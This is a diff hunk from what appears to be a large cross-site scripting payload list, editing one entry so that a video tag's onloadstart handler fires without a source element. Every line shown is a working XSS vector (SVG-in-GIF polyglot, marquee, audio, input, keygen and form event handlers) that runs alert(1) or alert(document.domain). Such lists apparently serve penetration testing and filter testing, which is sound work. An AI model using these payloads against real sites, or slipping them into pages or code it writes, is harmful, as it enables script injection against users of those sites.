@@ -4126,7 +4126,7 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <marquee onstart=alert(1)>
 <marquee loop=1 width=0 onfinish=alert(1)>
 <audio src onloadstart=alert(1)>
-<video onloadstart=alert(1)><source>
+<video onloadstart=alert(1)>
 <input autofocus onblur=alert(1)>
 <keygen autofocus onfocus=alert(1)>
 <form onsubmit=alert(1)><input type=submit>
